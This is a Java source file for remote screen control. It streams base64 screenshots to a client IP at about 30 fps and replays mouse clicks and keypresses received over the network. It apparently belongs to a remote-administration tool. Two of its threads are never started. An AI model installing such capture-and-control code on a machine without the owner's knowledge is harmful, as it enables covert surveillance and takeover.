package command;

import main.Client;
import main.Info;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;

public class Control {


    // Get the size of the screen
    static final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
    static final int width = (int) screenSize.getWidth();
    static final int height = (int) screenSize.getHeight();

    static boolean running = false;

    public static void control(String command) {

        running = true;

        // On another thread, check for the stop command
        new Thread(() -> {
            while (running) {
                String response = Client.receive(12000);
                if (response.equals("stop_recording")) {
                    running = false;
                }
            }
        }).start();

        new Thread(() -> {
            // Mouse
            while (running) {
                String response = Client.receive(19820);
                int x = Integer.parseInt(response.split(" ")[0]);
                int y = Integer.parseInt(response.split(" ")[1]);
                int frameWidth = Integer.parseInt(response.split(" ")[2]);
                int frameHeight = Integer.parseInt(response.split(" ")[3]);
                if (response.split(" ")[4].equals("left")) {
                    ScreenController.leftClick(x, y, frameWidth, frameHeight);
                } else if (response.split(" ")[4].equals("right")) {
                    ScreenController.rightClick(x, y, frameWidth, frameHeight);
                }
            }
        }).start();

        new Thread(() -> {
            try {
                while (running) {
                    AtomicBoolean connected = new AtomicBoolean(false);
                    new Thread(() -> {
                        String msg = Client.receive(19822);
                        if (msg.equals("xxx")) {
                            connected.set(true);
                        }
                    });
                    // Wait for the client to connect
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    if (!connected.get()) {
                        running = false;
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        new Thread(() -> {
            // Keyboard
            while (running) {
                String response = Client.receive(19821);
                int keyCode = Integer.parseInt(response);
                ScreenController.keyPress(keyCode);
            }
        }).start();

        loop();
    }

    public static void run() {
        // Take a screenshot
        BufferedImage image = null;
        try {
            Robot robot = new Robot();
            image = robot.createScreenCapture(new Rectangle(0, 0, width, height));
        } catch (AWTException e) {
            e.printStackTrace();
        }

        // Convert the image to a string
        String imageString = null;
        try {
            imageString = imageToString(image);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Send the image to the client
        Client.send(imageString, Info.clientIP, 13377, false);
    }

    public static void loop() {
        final int TARGET_FPS = 30;
        final long OPTIMAL_TIME = 1000000000 / TARGET_FPS; // in nanoseconds

        long lastLoopTime = System.nanoTime();
        long now;
        long updateTime;
        long delta;

        while (running) {
            now = System.nanoTime();
            delta = now - lastLoopTime;
            lastLoopTime = now;

            updateTime = delta / 1000000; // in milliseconds

            run();

            // Sleep to maintain 30 fps
            try {
                long sleepTime = (lastLoopTime - System.nanoTime() + OPTIMAL_TIME) / 1000000;
                if (sleepTime > 0) {
                    Thread.sleep(sleepTime);
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }


    public static String imageToString(BufferedImage image) throws IOException {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ImageIO.write(image, "png", outputStream);
        byte[] imageBytes = outputStream.toByteArray();
        return Base64.getEncoder().encodeToString(imageBytes);
    }
}
